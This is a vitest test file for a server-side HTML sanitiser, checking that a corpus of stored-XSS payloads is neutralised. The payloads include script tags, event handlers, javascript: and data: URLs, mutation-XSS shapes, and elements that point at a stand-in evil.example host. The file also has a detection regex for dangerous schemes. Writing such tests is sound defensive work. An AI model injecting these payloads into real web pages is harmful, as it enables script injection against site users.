// Server-side allow-list sanitiser (threat model "Stored XSS"; Slice 2a acceptance: XSS corpus
// neutralised). The corpus covers script injection, event handlers, dangerous URL schemes and
// encodings, SVG/MathML, CSS, forms, frames, mutation-XSS shapes and attribute breakouts.
import { describe, expect, it } from "vitest";

import { cleanPlainText, htmlToPlainText, sanitizeRichText } from "@/shared/security/sanitize-html";

const CORPUS = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=//evil.example/xss.js></SCRIPT>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
  "<body onload=alert(1)>",
  "<iframe src=javascript:alert(1)></iframe>",
  "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
  "<object data=javascript:alert(1)></object>",
  "<embed src=javascript:alert(1)>",
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href="jav&#97;script:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="//evil.example">x</a>',
  '<a href="http://insecure.example">x</a>',
  '<a href="https://ok.example" onclick="alert(1)" onmouseover="alert(1)">x</a>',
  '<a href="https://ok.example" target="_self" rel="opener">x</a>',
  '<p style="background:url(javascript:alert(1))">x</p>',
  "<style>@import 'javascript:alert(1)';</style>",
  '<link rel=stylesheet href="https://evil.example/x.css">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<form action="https://evil.example"><input name=x><button>go</button></form>',
  '<input onfocus=alert(1) autofocus>',
  '<details open ontoggle=alert(1)>',
  '<video><source onerror=alert(1)></video>',
  '<div id="x" class="y" data-x="1">x</div>',
  '"><script>alert(1)</script>',
  "<<script>script>alert(1)<</script>/script>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
  "<template><script>alert(1)</script></template>",
  '<base href="https://evil.example/">',
  "<p>ok</p><!-- <script>alert(1)</script> -->",
  "<![CDATA[<script>alert(1)</script>]]>",
  "<a href=\"https://ok.example\"><img src=x onerror=alert(1)></a>",
  "<x onclick=alert(1)>x</x>",
];

const ALLOWED_TAGS = new Set(["p", "br", "strong", "b", "em", "i", "u", "s", "ul", "ol", "li", "blockquote", "a"]);

/** Every tag in sanitised output is allow-listed, and only links carry attributes. */
function assertSafe(html: string) {
  for (const match of html.matchAll(/<\/?([a-zA-Z][\w-]*)([^>]*)>/g)) {
    const [, tag, attrs] = match;
    expect(ALLOWED_TAGS.has(tag!.toLowerCase()), `tag <${tag}> in ${html}`).toBe(true);
    if (tag!.toLowerCase() !== "a") expect(attrs!.trim(), `attributes on <${tag}> in ${html}`).toBe("");
    else {
      const names = [...attrs!.matchAll(/([\w-]+)=/g)].map((m) => m[1]);
      expect(names.every((name) => ["href", "rel", "target"].includes(name!)), `link attributes in ${html}`).toBe(true);
      const href = /href="([^"]*)"/.exec(attrs!)?.[1];
      if (href !== undefined) expect(href, html).toMatch(/^(https:\/\/|mailto:)/);
    }
  }
  expect(html).not.toMatch(/javascript:|vbscript:|data:|on\w+=|<script|<style|<iframe|<img|<svg/i);
}

describe("sanitizeRichText", () => {
  for (const payload of CORPUS) {
    it(`neutralises ${payload}`, () => {
      const output = sanitizeRichText(payload);
      assertSafe(output);
      // Idempotent: sanitising stored output again changes nothing (it is re-sanitised on read).
      expect(sanitizeRichText(output)).toBe(output);
    });
  }

  it("keeps the allowed formatting", () => {
    const html = "<p><strong>Bold</strong> <em>it</em> <u>u</u> <s>s</s></p><ul><li>one</li></ul><ol><li>two</li></ol><blockquote>q</blockquote><p>a<br />b</p>";
    expect(sanitizeRichText(html)).toBe(html);
  });

  it("forces safe link attributes and keeps https and mailto links", () => {
    expect(sanitizeRichText('<a href="https://thapar.edu" target="_self">TIET</a>')).toBe('<a href="https://thapar.edu" rel="noopener noreferrer nofollow ugc" target="_blank">TIET</a>');
    expect(sanitizeRichText('<a href="mailto:club@thapar.edu">mail</a>')).toContain('href="mailto:club@thapar.edu"');
  });

  it("drops the content of script-like elements instead of keeping it as text", () => {
    expect(sanitizeRichText("<p>a<script>alert(1)</script>b</p>")).toBe("<p>ab</p>");
    expect(sanitizeRichText("<svg><text>hidden</text></svg>ok")).toBe("ok");
  });
});

describe("htmlToPlainText", () => {
  it("returns text only, with entities decoded and whitespace collapsed", () => {
    expect(htmlToPlainText("<p>Tom &amp; Jerry</p><p>&lt;b&gt; x</p><script>alert(1)</script>")).toBe("Tom & Jerry <b> x");
    expect(htmlToPlainText("<ul><li>a</li><li>b</li></ul>")).toBe("a b");
  });
});

describe("cleanPlainText", () => {
  it("removes control and bidi-override characters and normalises newlines", () => {
    const input = ["a", String.fromCodePoint(0), "b", String.fromCodePoint(0x202e), "c\r\n\r\n\r\n\r\nd ", String.fromCodePoint(0x200b)].join("");
    expect(cleanPlainText(input)).toBe("abc\n\nd");
  });
});
